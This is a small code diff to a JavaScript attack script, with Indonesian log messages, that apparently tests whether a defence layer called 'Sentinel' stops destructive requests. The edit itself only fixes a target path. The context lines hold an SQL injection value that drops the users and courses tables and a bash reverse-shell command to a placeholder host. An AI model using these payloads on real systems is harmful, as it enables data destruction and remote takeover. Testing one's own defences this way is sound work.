@@ -8,7 +8,7 @@ async function runDestructiveAttack(stats, vulnerabilities) {
     console.log(`\n💀 MEMULAI SERANGAN DESTRUKTIF & MEMATIKAN...`);
     console.log(`⚠️ PERINGATAN: Serangan ini dirancang untuk merusak sistem jika tidak tertahan oleh Sentinel.`);
 
-    const targets = ['/courses', '/login', '/dashboard/admin/users', '/pring'];
+    const targets = ['/courses', '/login', '/dashboard/admin/users', '/pricing'];
     const destructivePayloads = [
         { name: 'DB_NUKER', method: 'POST', data: { id: "1'; DROP TABLE users; DROP TABLE courses; --", action: 'delete' } },
         { name: 'RCE_REVERSE_SHELL', method: 'POST', data: { cmd: "bash -i >& /dev/tcp/evil.com/4444 0>&1" } },
